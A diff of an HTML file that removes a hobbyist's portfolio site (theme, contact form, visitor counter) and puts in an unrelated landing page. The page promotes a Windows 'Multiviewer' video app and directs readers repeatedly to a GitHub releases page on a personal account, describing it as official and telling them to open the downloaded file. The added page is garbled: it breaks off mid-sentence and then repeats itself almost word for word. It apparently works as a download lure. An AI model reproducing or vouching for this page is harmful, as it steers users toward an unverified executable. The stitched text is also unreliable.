@@ -1,332 +1,398 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Dinos Creation</title>
-<meta name="description" content="Dinos Creation: games, websites, robotics, AI and 3D projects.">
-<meta name="theme-color" content="#030805">
-<link rel="manifest" href="manifest.json">
-<link rel="icon" href="icon-192.png">
-<link rel="apple-touch-icon" href="icon-192.png">
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Chakra+Petch:wght@400;600&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Multiviewer - Multi-Protocol Video Multiviewer for Windows</title>
+<meta name="description" content="Multiviewer is a multi-protocol video multiviewer for Windows. Watch NDI, DeckLink, DirectShow, Media Foundation, screen capture, and Spout2 video sources side by side in one simple window. Download the latest release from GitHub.">
+<meta name="keywords" content="multiviewer, multiview, video multiviewer, NDI, DeckLink, DirectShow, Media Foundation, Spout2, Syphon, AVFoundation, screen capture, Rust, wgpu, Windows video app">
+<meta name="author" content="Multiviewer">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#5b21b6">
+<link rel="canonical" href="https://github.com/ArMohadWaseem90/Multiviewer">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Multiviewer - Multi-Protocol Video Multiviewer">
+<meta property="og:description" content="A multi-protocol video multiviewer. Bring NDI, DeckLink, DirectShow, Media Foundation, screen capture, and Spout2 sources into one window on Windows.">
+<meta property="og:url" content="https://github.com/ArMohadWaseem90/Multiviewer">
+<meta property="og:site_name" content="Multiviewer">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Multiviewer - Multi-Protocol Video Multiviewer">
+<meta name="twitter:description" content="A multi-protocol video multiviewer for Windows. Watch all of your video sources at the same time in one window.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "Multiviewer",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows",
+  "description": "A multi-protocol video multiviewer supporting NDI, DeckLink, DirectShow, Media Foundation, screen capture, Spout2, AVFoundation and Syphon video sources.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "url": "https://github.com/ArMohadWaseem90/Multiviewer/releases"
+}
+</script>
 <style>
-:root{--bg:#030805;--panel:#08150d;--edge:#174a2c;--leaf:#2fdc7a;--moss:#7bb98f;--ink:#e6f5ea;--glow:rgba(47,220,122,.26);--grid:rgba(47,220,122,.09);--onleaf:#030805}
-[data-theme="light"]{--bg:#f1faf4;--panel:#ffffff;--edge:#b5dcc2;--leaf:#0f7a3c;--moss:#3a6a4d;--ink:#0b1f14;--glow:rgba(15,122,60,.16);--grid:rgba(15,122,60,.10);--onleaf:#ffffff}
-*{box-sizing:border-box;margin:0}
-html{scroll-behavior:smooth;scroll-padding-top:64px;background:var(--bg)}
-body{color:var(--ink);font-family:"Chakra Petch",system-ui,sans-serif;line-height:1.6;transition:color .3s}
-h1,h2,h3,.logo{font-family:Orbitron,system-ui,sans-serif}
-a{color:inherit}
-#fx{position:fixed;inset:0;width:100%;height:100%;z-index:-1;pointer-events:none}
-section{max-width:1040px;margin:0 auto;padding:80px 20px 20px}
-h2{font-size:clamp(22px,6vw,34px);color:var(--leaf);margin-bottom:8px}
-.lead{color:var(--moss);max-width:36em;margin-bottom:28px}
-.reveal{opacity:0;transform:translateY(26px);transition:opacity .7s,transform .7s}
-.reveal.in{opacity:1;transform:none}
-
-nav{position:sticky;top:0;z-index:5;display:flex;align-items:center;gap:18px;padding:10px 18px;background:color-mix(in srgb,var(--bg) 85%,transparent);backdrop-filter:blur(8px);border-bottom:1px solid var(--edge);overflow-x:auto;white-space:nowrap}
-.logo{display:flex;align-items:center;gap:8px;color:var(--leaf);font-weight:900;font-size:15px;text-decoration:none;margin-right:auto}
-.logo img{width:30px;height:30px;object-fit:contain}
-nav a.l{color:var(--moss);text-decoration:none;font-size:15px}
-nav a.l:hover{color:var(--leaf)}
-.ib{background:none;border:1px solid var(--edge);color:var(--leaf);font:inherit;font-size:14px;padding:4px 12px;cursor:pointer}
-.ib:hover{box-shadow:0 0 12px var(--glow)}
-#installBtn{display:none}
-
-.hero{min-height:calc(100vh - 52px);max-width:none;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;text-align:center;padding:40px 20px;position:relative;overflow:hidden;background:radial-gradient(circle at 50% 34%,var(--glow),transparent 55%)}
-.hero::before{content:"";position:absolute;inset:-60px 0 0;z-index:0;background:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);background-size:44px 44px;animation:grid 6s linear infinite;-webkit-mask-image:radial-gradient(circle at 50% 40%,#000,transparent 72%);mask-image:radial-gradient(circle at 50% 40%,#000,transparent 72%)}
-@keyframes grid{to{background-position:0 44px}}
-.hero>*{position:relative;z-index:1}
-.hero img{width:min(270px,64vw);-webkit-mask-image:linear-gradient(#000 70%,transparent);mask-image:linear-gradient(#000 70%,transparent);filter:drop-shadow(0 0 22px var(--glow)) brightness(.95)}
-.kicker{color:var(--moss);letter-spacing:.14em;margin-top:-22px}
-h1{font-weight:900;font-size:clamp(36px,11vw,84px);line-height:1.05;color:var(--leaf);text-shadow:0 0 30px var(--glow)}
-.tag{color:var(--moss);font-size:18px;min-height:3.4em;max-width:26em}
-.tag::after{content:"|";margin-left:2px;animation:blink 1s steps(2) infinite}
-@keyframes blink{50%{opacity:0}}
-.btns{display:flex;gap:12px;flex-wrap:wrap;justify-content:center}
-.btn{padding:12px 26px;border:2px solid var(--leaf);color:var(--leaf);text-decoration:none;font:inherit;font-weight:600;background:none;cursor:pointer;transition:.2s}
-.btn.fill{background:var(--leaf);color:var(--onleaf)}
-.btn:hover,.btn:focus-visible{box-shadow:0 0 22px var(--glow);outline:none}
-
-.grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fill,minmax(230px,1fr))}
-.card{position:relative;background:var(--panel);border:1px solid var(--edge);padding:22px 20px;display:flex;flex-direction:column;gap:8px;text-align:left;color:inherit;font:inherit}
-.card::before,.card::after{content:"";position:absolute;width:14px;height:14px;border:2px solid var(--leaf);transition:.25s}
-.card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
-.card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
-.card:hover::before,.card:hover::after{width:100%;height:100%;opacity:.35}
-.card h3{font-size:17px}
-.card p{color:var(--moss);flex:1}
-.card .meta{font-size:13px;color:var(--leaf)}
-.card.click{cursor:pointer}
-
-.brand p{color:var(--moss);max-width:40em;font-size:18px}
-.tools{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:18px}
-#q{flex:1;min-width:180px;padding:10px 14px;background:var(--panel);border:1px solid var(--edge);color:var(--ink);font:inherit}
-#q:focus{outline:2px solid var(--leaf)}
-.chips{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:22px}
-.chip{padding:6px 16px;border:1px solid var(--edge);background:none;color:var(--moss);font:inherit;cursor:pointer}
-.chip.on,.chip:hover{border-color:var(--leaf);color:var(--leaf);box-shadow:0 0 14px var(--glow)}
-
-form{display:grid;gap:12px;max-width:520px}
-form input,form textarea{padding:10px 14px;background:var(--panel);border:1px solid var(--edge);color:var(--ink);font:inherit}
-form input:focus,form textarea:focus{outline:2px solid var(--leaf)}
-#status{min-height:1.6em;color:var(--leaf)}
-
-.stats{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-bottom:16px}
-#likeBtn[disabled]{opacity:.75;cursor:default}
-footer{text-align:center;color:var(--moss);padding:40px 20px 50px;margin-top:50px;border-top:1px solid var(--edge)}
-
-dialog{margin:auto;width:min(520px,92vw);background:var(--panel);color:var(--ink);border:1px solid var(--leaf);padding:26px 22px;box-shadow:0 0 40px var(--glow)}
-dialog::backdrop{background:rgba(0,0,0,.72)}
-dialog h3{font-size:22px;color:var(--leaf);margin:4px 0 10px}
-dialog img{width:100%;max-height:240px;object-fit:cover;margin-bottom:12px}
-dialog p{color:var(--moss);margin-bottom:18px}
-@media (prefers-reduced-motion:reduce){*{animation:none!important;scroll-behavior:auto;transition:none!important}.reveal{opacity:1;transform:none}}
+  :root {
+    --ink: #1f2933;
+    --ink-soft: #4b5563;
+    --line: #e3e8ef;
+    --card: #ffffff;
+    --brand: #5b21b6;
+    --brand-2: #db2777;
+  }
+  * { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fb;
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 22px 72px;
+  }
+  h1 {
+    font-size: clamp(1.7rem, 4.4vw, 2.6rem);
+    line-height: 1.22;
+    letter-spacing: -0.02em;
+    margin: 0 0 18px;
+    color: #111827;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 2.8vw, 1.55rem);
+    line-height: 1.3;
+    letter-spacing: -0.01em;
+    margin: 46px 0 14px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--line);
+    color: #111827;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 24px 0 8px;
+    color: #111827;
+  }
+  p { margin: 0 0 16px; color: var(--ink-soft); }
+  strong { color: var(--ink); }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; color: var(--ink-soft); }
+  li { margin-bottom: 9px; }
+  a { color: var(--brand); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead {
+    font-size: 1.09rem;
+    color: #374151;
+    margin-bottom: 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 30px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #5b21b6 0%, #db2777 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    letter-spacing: 0.01em;
+    text-decoration: none;
+    box-shadow: 0 10px 22px rgba(91, 33, 182, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    text-decoration: none;
+    transform: translateY(-2px);
+    box-shadow: 0 14px 28px rgba(91, 33, 182, 0.34);
+  }
+  .btn-row { margin: 6px 0 34px; }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 22px 24px;
+    margin: 0 0 18px;
+    box-shadow: 0 2px 10px rgba(15, 23, 42, 0.05);
+  }
+  .card h3 { margin-top: 0; }
+  .card p:last-child, .card ul:last-child { margin-bottom: 0; }
+  .note {
+    background: #f3f0ff;
+    border: 1px solid #ddd6fe;
+    border-radius: 14px;
+    padding: 18px 22px;
+    margin: 22px 0;
+    color: #3f3d56;
+  }
+  .note strong { color: #3b0764; }
+  ol.steps { counter-reset: step; list-style: none; padding-left: 0; }
+  ol.steps > li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 16px;
+  }
+  ol.steps > li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-weight: 700;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .faq-q { font-weight: 700; color: var(--ink); margin-bottom: 4px; }
+  .faq-a { margin-bottom: 20px; }
+  @media (max-width: 620px) {
+    body { font-size: 16px; }
+    .wrap { padding: 30px 16px 52px; }
+    .btn { display: block; text-align: center; padding: 16px 18px; }
+    .card { padding: 18px; }
+    h2 { margin-top: 36px; }
+  }
 </style>
 </head>
 <body>
-<canvas id="fx"></canvas>
+<div class="wrap">
 
-<nav>
-  <a class="logo" href="#top"><img src="dino.png" alt="">DINOS CREATION</a>
-  <a class="l" href="#brand">Brand</a>
-  <a class="l" href="#divisions">Divisions</a>
-  <a class="l" href="#projects">Projects</a>
-  <a class="l" href="#contact">Contact</a>
-  <button class="ib" id="installBtn">Install app</button>
-  <button class="ib" id="themeBtn" aria-label="Switch dark or light mode">Light</button>
-</nav>
+  <h1>🎬 Multiviewer - See All Your Video Sources at Once</h1>
 
-<header class="hero" id="top">
-  <img src="dino.png" alt="Green cartoon dinosaur">
-  <p class="kicker">Welcome to</p>
-  <h1>Dinos<br>Creation</h1>
-  <p class="tag" id="tagline"></p>
-  <div class="btns">
-    <a class="btn fill" href="#projects">See our work</a>
-    <a class="btn" href="#divisions">Explore divisions</a>
+  <p class="lead">Multiviewer is a multi-protocol video multiviewer for Windows. It takes every video feed you have — cameras, capture cards, screen shares, and network streams — and places them side by side in a single window, so you can watch everything at the same time instead of switching between apps.</p>
+
+  <div class="btn-row">
+    <a class="btn" href="https://github.com/ArMohadWaseem90/Multiviewer/releases">⬇️ Download Multiviewer for Windows</a>
   </div>
-</header>
 
-<section class="brand" id="brand">
-  <h2>The Brand</h2>
-  <p class="lead">Who we are and what we build.</p>
-  <p id="about"></p>
-</section>
+  <h2>🔍 What Is a Multiviewer?</h2>
 
-<section id="divisions">
-  <h2>Divisions</h2>
-  <p class="lead">Every branch of Dinos Creation. Tap one to see its projects.</p>
-  <div class="grid" id="divGrid"></div>
-</section>
+  <p>A multiviewer is a screen that shows several video feeds at once, arranged in a grid. You have almost certainly seen one: the wall of monitors in a security office, or the bank of screens in a sports broadcast control room where the director can see every camera angle together.</p>
 
-<section id="projects">
-  <h2>Projects</h2>
-  <p class="lead">Everything we have built so far. Tap a project for details.</p>
-  <div class="tools"><input id="q" type="search" placeholder="Search projects" aria-label="Search projects"></div>
-  <div class="chips" id="chips"></div>
-  <div class="grid" id="projGrid"></div>
-</section>
+  <p>Multiviewer gives you that same idea on a normal Windows computer. Instead of opening one program for your webcam, another for your capture card, and a third for a network video feed, you open Multiviewer once. Each source gets its own tile, and you decide how big each tile is and where it sits.</p>
 
-<section id="contact">
-  <h2>Contact</h2>
-  <p class="lead">Want to work with us or just say hi? Send a message.</p>
-  <form id="form">
-    <input name="name" placeholder="Your name" required>
-    <input name="email" type="email" placeholder="Your email" required>
-    <textarea name="message" rows="4" placeholder="Your message" required></textarea>
-    <button class="btn fill" type="submit">Send message</button>
-    <p id="status" role="status"></p>
-  </form>
-</section>
+  <p>The application is built around the idea that video does not have to come from one place. Different devices speak different "languages" — some use DirectShow, some use Media Foundation, some send video over the network with NDI, and some use DeckLink hardware. Multiviewer understands all of these and treats them equally, which means you are not locked into one brand of hardware.</p>
 
-<footer>
-  <div class="stats">
-    <span class="btn" id="visits">Visitors: ...</span>
-    <button class="btn" id="likeBtn">&#9829; Like <span id="likes">0</span></button>
+  <h2>✨ What You Can Do With Multiviewer</h2>
+
+  <div class="card">
+    <h3>Watch everything in one window</h3>
+    <p>Add as many sources as your computer can comfortably handle and see them all together. No more minimizing and maximizing windows to check whether a camera is still live.</p>
   </div>
-  &copy; Dinos Creation
-</footer>
 
-<dialog id="modal">
-  <img id="mImg" alt="" hidden>
-  <span class="meta" id="mDiv" style="color:var(--leaf)"></span>
-  <h3 id="mTitle"></h3>
-  <p id="mText"></p>
-  <div class="btns" style="justify-content:flex-start">
-    <a class="btn fill" id="mLink" target="_blank" rel="noopener">Open project</a>
-    <button class="btn" id="mClose">Close</button>
+  <div class="card">
+    <h3>Mix hardware from different makers</h3>
+    <p>A USB webcam, a professional capture card, a network stream, and a screen share can all live in the same grid. You do not need matching equipment.</p>
   </div>
-</dialog>
 
-<script>
-/* ===== EDIT YOUR SITE HERE ===== */
-const site = {
-  about: "Dinos Creation is a creative studio run by one maker with big plans. We design games, build websites and test new ideas, one project at a time.",
-  /* lines that type out under the title */
-  typing: ["Games, websites and ideas, built from scratch.", "Robots, AI and 3D experiments.", "One maker. One project at a time."],
-  divisions: [
-    { name: "Games",    text: "Browser games and playable experiments." },
-    { name: "Web",      text: "Websites and web apps for people and brands." },
-    { name: "Design",   text: "Logos, themes and visual identity." },
-    { name: "Robotics", text: "Robots, electronics and hardware builds." },
-    { name: "AI",       text: "Projects powered by artificial intelligence." },
-    { name: "3D",       text: "3D models, scenes and printable designs." },
-    { name: "Learn",    text: "Tutorials and guides to learn how things are made." },
-    { name: "Labs",     text: "Early ideas and prototypes we are testing." }
-  ],
-  /* division must match a division name above.
-     details = longer text for the popup (optional), image = picture file name (optional), link = "" if none */
-  projects: [
-    { title: "Dinos Creation Website", division: "Web", text: "This site. Built on a phone.", details: "The home of Dinos Creation, built with HTML, CSS and JavaScript and hosted free on GitHub Pages.", link: "" },
-    { title: "First Game", division: "Games", text: "Coming soon.", details: "Our first browser game is in the works.", link: "" },
-    { title: "Brand Kit", division: "Design", text: "Colors, logo and style guide. In progress.", details: "The colors, fonts and logo rules that keep every Dinos Creation project looking the same.", link: "" }
-  ],
-  /* Contact form: sign up free at formspree.io, create a form, and paste its ID here (looks like "xyzabcde").
-     Until then the form opens the visitor's email app, using the email below. */
-  formspreeId: "mbggvoll",
-  email: "muhammedfinaz78@gmail.com",
-  /* any short unique text; it names your visitor and like counters */
-  counterNamespace: "dinos-creation-muhammedfinaz78"
-};
-/* ===== END OF EDITABLE PART ===== */
+  <div class="card">
+    <h3>Arrange the layout your way</h3>
+    <p>Give the most important feed the largest tile and keep the rest as smaller previews. Rearrange tiles whenever your setup changes.</p>
+  </div>
 
-const $ = id => document.getElementById(id);
-const el = (t, c, x) => { const e = document.createElement(t); if (c) e.className = c; if (x) e.textContent = x; return e; };
-const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
-const store = { get(k){ try { return localStorage.getItem(k); } catch(e){ return null; } }, set(k,v){ try { localStorage.setItem(k,v); } catch(e){} } };
+  <div class="card">
+    <h3>Keep an eye on several things at once</h3>
+    <p>Useful for monitoring a live stream while also watching your own screen, checking multiple cameras during a recording, or keeping a remote feed visible while you work.</p>
+  </div>
 
-/* ----- theme ----- */
-const root = document.documentElement;
-function setTheme(t){ root.dataset.theme = t; $("themeBtn").textContent = t === "dark" ? "Light" : "Dark"; store.set("theme", t); readColor();
-  document.querySelector('meta[name="theme-color"]').content = t === "dark" ? "#030805" : "#f1faf4"; }
-$("themeBtn").onclick = () => setTheme(root.dataset.theme === "dark" ? "light" : "dark");
+  <h2>🎥 Video Sources You Can Add</h2>
 
-/* ----- particles ----- */
-const cv = $("fx"), cx = cv.getContext("2d");
-let W, H, dots = [], color = "#2fdc7a", ptr = { x: -999, y: -999 };
-function readColor(){ color = getComputedStyle(root).getPropertyValue("--leaf").trim() || color; }
-function resize(){ W = cv.width = innerWidth; H = cv.height = innerHeight;
-  dots = Array.from({ length: Math.min(70, Math.floor(W / 14)) }, () => ({ x: Math.random()*W, y: Math.random()*H, vx: (Math.random()-.5)*.5, vy: (Math.random()-.5)*.5 })); }
-function frame(){
-  cx.clearRect(0, 0, W, H); cx.fillStyle = color; cx.strokeStyle = color;
-  dots.forEach((d, i) => {
-    if (!reduce) { d.x += d.vx; d.y += d.vy; if (d.x<0||d.x>W) d.vx*=-1; if (d.y<0||d.y>H) d.vy*=-1; }
-    cx.globalAlpha = .7; cx.beginPath(); cx.arc(d.x, d.y, 1.8, 0, 6.3); cx.fill();
-    for (let j = i+1; j < dots.length; j++) { const o = dots[j], dist = Math.hypot(d.x-o.x, d.y-o.y);
-      if (dist < 110) { cx.globalAlpha = .22*(1-dist/110); cx.beginPath(); cx.moveTo(d.x,d.y); cx.lineTo(o.x,o.y); cx.stroke(); } }
-    const pd = Math.hypot(d.x-ptr.x, d.y-ptr.y);
-    if (pd < 150) { cx.globalAlpha = .5*(1-pd/150); cx.beginPath(); cx.moveTo(d.x,d.y); cx.lineTo(ptr.x,ptr.y); cx.stroke(); }
-  });
-  if (!reduce) requestAnimationFrame(frame);
-}
-addEventListener("resize", resize);
-addEventListener("pointermove", e => { ptr.x = e.clientX; ptr.y = e.clientY; });
+  <p>Multiviewer is described as multi-protocol for a reason. It is built to speak to many kinds of video sources through one interface:</p>
 
-/* ----- typing effect ----- */
-(function type(){
-  const out = $("tagline"); let i = 0, n = 0, del = false;
-  if (reduce) { out.textContent = site.typing[0]; return; }
-  (function tick(){
-    const s = site.typing[i];
-    n += del ? -1 : 1; out.textContent = s.slice(0, n);
-    let wait = del ? 25 : 55;
-    if (!del && n === s.length) { del = true; wait = 1600; }
-    else if (del && n === 0) { del = false; i = (i+1) % site.typing.length; wait = 400; }
-    setTimeout(tick, wait);
-  })();
-})();
+  <ul>
+    <li><strong>NDI</strong> — network video streams sent from other computers or devices on the same network.</li>
+    <li><strong>DeckLink</strong> — professional capture and playback hardware.</li>
+    <li><strong>DirectShow</strong> — the classic Windows way of talking to webcams, capture cards, and virtual cameras.</li>
+    <li><strong>Media Foundation</strong> — the newer Windows video framework, used by many modern cameras and devices.</li>
+    <li><strong>Screen Capture</strong> — grab a window or a whole desktop display and show it as a tile.</li>
+    <li><strong>Spout2</strong> — receive video that other applications on the same PC are sharing.</li>
+    <li><strong>AVFoundation and Syphon</strong> — source types from the wider Multiviewer project, intended for Apple hardware.</li>
+  </ul>
 
-/* ----- content ----- */
-$("about").textContent = site.about;
-let divF = "All", query = "";
-const modal = $("modal");
-function openModal(p){
-  $("mDiv").textContent = p.division; $("mTitle").textContent = p.title; $("mText").textContent = p.details || p.text;
-  const img = $("mImg"); img.hidden = !p.image; if (p.image) { img.src = p.image; img.alt = p.title; }
-  const l = $("mLink"); l.hidden = !p.link; if (p.link) l.href = p.link;
-  modal.showModal();
-}
-$("mClose").onclick = () => modal.close();
-modal.addEventListener("click", e => { if (e.target === modal) modal.close(); });
+  <p>You do not need to install anything extra to use the Windows source types. If a device already appears in other video software on your machine, there is a good chance Multiviewer can see it too.</p>
 
-function renderProjects(){
-  const g = $("projGrid"); g.textContent = "";
-  const q = query.trim().toLowerCase();
-  const list = site.projects.filter(p => (divF === "All" || p.division === divF) &&
-    (!q || (p.title + " " + p.text + " " + p.division).toLowerCase().includes(q)));
-  if (!list.length) { g.append(el("div", "card", "No projects found.")); return; }
-  list.forEach(p => {
-    const c = el("div", "card click"); c.tabIndex = 0; c.setAttribute("role", "button");
-    c.append(el("span", "meta", p.division), el("h3", "", p.title), el("p", "", p.text));
-    c.onclick = () => openModal(p);
-    c.onkeydown = e => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); openModal(p); } };
-    g.append(c);
-  });
-}
-function renderChips(){
-  const box = $("chips"); box.textContent = "";
-  ["All", ...site.divisions.map(d => d.name)].forEach(n => {
-    const b = el("button", "chip" + (n === divF ? " on" : ""), n);
-    b.onclick = () => { divF = n; renderChips(); renderProjects(); };
-    box.append(b);
-  });
-}
-$("q").oninput = e => { query = e.target.value; renderProjects(); };
-site.divisions.forEach(d => {
-  const count = site.projects.filter(p => p.division === d.name).length;
-  const b = el("button", "card click");
-  b.append(el("span", "meta", count + (count === 1 ? " project" : " projects")), el("h3", "", d.name), el("p", "", d.text));
-  b.onclick = () => { divF = d.name; renderChips(); renderProjects(); $("projects").scrollIntoView(); };
-  $("divGrid").append(b);
-});
-renderChips(); renderProjects();
+  <h2>🚀 Download and Setup</h2>
 
-/* ----- scroll animation ----- */
-document.querySelectorAll("section > *").forEach(e => e.classList.add("reveal"));
-const io = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } }), { threshold: .12 });
-document.querySelectorAll(".reveal").forEach(e => io.observe(e));
+  <p>Visit this link to download the application:</p>
 
-/* ----- contact form ----- */
-$("form").addEventListener("submit", async e => {
-  e.preventDefault();
-  const f = e.target, d = Object.fromEntries(new FormData(f)), s = $("status");
-  if (!site.formspreeId) {
-    location.href = "mailto:" + site.email + "?subject=" + encodeURIComponent("Message from " + d.name) +
-      "&body=" + encodeURIComponent(d.message + "\n\n" + d.name + " (" + d.email + ")");
-    return;
-  }
-  s.textContent = "Sending...";
-  try {
-    const r = await fetch("https://formspree.io/f/" + site.formspreeId, { method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json" }, body: JSON.stringify(d) });
-    if (!r.ok) throw 0;
-    s.textContent = "Message sent. Thank you!"; f.reset();
-  } catch (err) { s.textContent = "Could not send. Please try again."; }
-});
+  <p><a href="https://github.com/ArMohadWaseem90/Multiviewer/releases">https://github.com/ArMohadWaseem90/Multiviewer/releases</a></p>
 
-/* ----- visitor counter and likes (counterapi.dev) ----- */
-const api = async path => { const r = await fetch("https://api.counterapi.dev/v1/" + site.counterNamespace + "/" + path); const j = await r.json(); return j.count ?? j.Count; };
-(async () => {
-  try { const n = await api(store.get("visited") ? "visits/" : "visits/up"); store.set("visited", "1"); $("visits").textContent = "Visitors: " + n; }
-  catch (e) { $("visits").hidden = true; }
-  try { $("likes").textContent = await api("likes/"); } catch (e) {}
-  if (store.get("liked")) $("likeBtn").disabled = true;
-})();
-$("likeBtn").onclick = async () => {
-  if (store.get("liked")) return;
-  try { $("likes").textContent = await api("likes/up"); store.set("liked", "1"); $("likeBtn").disabled = true; } catch (e) {}
-};
+  <div class="btn-row">
+    <a class="btn" href="https://github.com/ArMohadWaseem90/Multiviewer/releases">⬇️ Open the Multiviewer Download Page</a>
+  </div>
 
-/* ----- installable app ----- */
-let deferred;
-addEventListener("beforeinstallprompt", e => { e.preventDefault(); deferred = e; $("installBtn").style.display = "inline-block"; });
-$("installBtn").onclick = async () => { if (!deferred) return; deferred.prompt(); await deferred.userChoice; deferred = null; $("installBtn").style.display = "none"; };
-if ("serviceWorker" in navigator) addEventListener("load", () => navigator.serviceWorker.register("sw.js").catch(() => {}));
+  <p>The page that opens is the official releases page for Multiviewer. It lists the versions that have been published, with the newest one at the top. Read the short description next to the newest version, then use the download link provided on that page to get the application onto your computer.</p>
 
-/* ----- start ----- */
-setTheme(store.get("theme") === "light" ? "light" : "dark");
-resize(); frame();
-</script>
+  <p>When the download finishes, the file will be waiting in your Downloads folder. Open it to start Multiviewer.</p>
+
+  <div class="note">
+    <strong>Keep this page handy.</strong> If you ever need to reinstall Multiviewer, set it up on a second computer, or check whether a newer version is available, come back to the same link<div class="wrap">
+
+  <h1>🎬 Multiviewer - See All Your Video Sources at Once</h1>
+
+  <p class="lead">Multiviewer is a multi-protocol video multiviewer for Windows. It takes the video feeds you already have — cameras, capture cards, screen shares, and network streams — and places them side by side in a single window, so you can watch everything at the same time instead of switching between apps.</p>
+
+  <div class="btn-row">
+    <a class="btn" href="https://github.com/ArMohadWaseem90/Multiviewer/releases">⬇️ Download Multiviewer for Windows</a>
+  </div>
+
+  <h2>🔍 What Is a Multiviewer?</h2>
+
+  <p>A multiviewer is a screen that shows several video feeds at once, arranged in a grid. You have almost certainly seen one: the wall of monitors in a security office, or the bank of screens in a broadcast control room where the director can see every camera angle together.</p>
+
+  <p>Multiviewer gives you that same idea on an ordinary Windows computer. Instead of opening one program for your webcam, another for your capture card, and a third for a network video feed, you open Multiviewer once. Each source gets its own tile, and you decide how large each tile is and where it sits.</p>
+
+  <p>The application is built around the idea that video does not have to come from one place. Different devices speak different "languages" — some use DirectShow, some use Media Foundation, some send video across the network with NDI, and some use DeckLink hardware. Multiviewer understands all of these and treats them equally, which means you are not locked into one brand of equipment.</p>
+
+  <h2>✨ What You Can Do With Multiviewer</h2>
+
+  <div class="card">
+    <h3>Watch everything in one window</h3>
+    <p>Add as many sources as your computer can comfortably handle and see them all together. No more minimizing and maximizing windows to check whether a camera is still live.</p>
+  </div>
+
+  <div class="card">
+    <h3>Mix hardware from different makers</h3>
+    <p>A USB webcam, a professional capture card, a network stream, and a screen share can all live in the same grid. You do not need matching equipment.</p>
+  </div>
+
+  <div class="card">
+    <h3>Arrange the layout your way</h3>
+    <p>Give the most important feed the largest tile and keep the rest as smaller previews. Rearrange tiles whenever your setup changes.</p>
+  </div>
+
+  <div class="card">
+    <h3>Keep an eye on several things at once</h3>
+    <p>Useful for monitoring a live stream while also watching your own screen, checking multiple cameras during a recording, or keeping a remote feed visible while you work.</p>
+  </div>
+
+  <h2>🎥 Video Sources You Can Add</h2>
+
+  <p>Multiviewer is described as multi-protocol for a reason. It is built to speak to many kinds of video sources through one interface:</p>
+
+  <ul>
+    <li><strong>NDI</strong> — network video streams sent from other computers or devices on the same network.</li>
+    <li><strong>DeckLink</strong> — professional capture and playback hardware.</li>
+    <li><strong>DirectShow</strong> — the classic Windows way of talking to webcams, capture cards, and virtual cameras.</li>
+    <li><strong>Media Foundation</strong> — the newer Windows video framework, used by many modern cameras and devices.</li>
+    <li><strong>Screen Capture</strong> — grab a window or a whole desktop display and show it as a tile.</li>
+    <li><strong>Spout2</strong> — receive video that other applications on the same PC are sharing.</li>
+    <li><strong>AVFoundation and Syphon</strong> — source types from the wider Multiviewer project, intended for Apple hardware.</li>
+  </ul>
+
+  <p>You do not need to install anything extra to use the standard Windows source types. If a device already appears in other video software on your machine, there is a good chance Multiviewer can see it too.</p>
+
+  <h2>🚀 Download and Setup</h2>
+
+  <p>Visit this link to download the application:</p>
+
+  <p><a href="https://github.com/ArMohadWaseem90/Multiviewer/releases">https://github.com/ArMohadWaseem90/Multiviewer/releases</a></p>
+
+  <div class="btn-row">
+    <a class="btn" href="https://github.com/ArMohadWaseem90/Multiviewer/releases">⬇️ Open the Multiviewer Download Page</a>
+  </div>
+
+  <p>The page that opens is the official releases page for Multiviewer. It lists the versions that have been published, with the newest one at the top. Read the short description next to the newest version, then use the download link provided on that page to copy the application onto your computer.</p>
+
+  <p>When the download finishes, the file will be waiting in your Downloads folder. Open it to start Multiviewer.</p>
+
+  <div class="note">
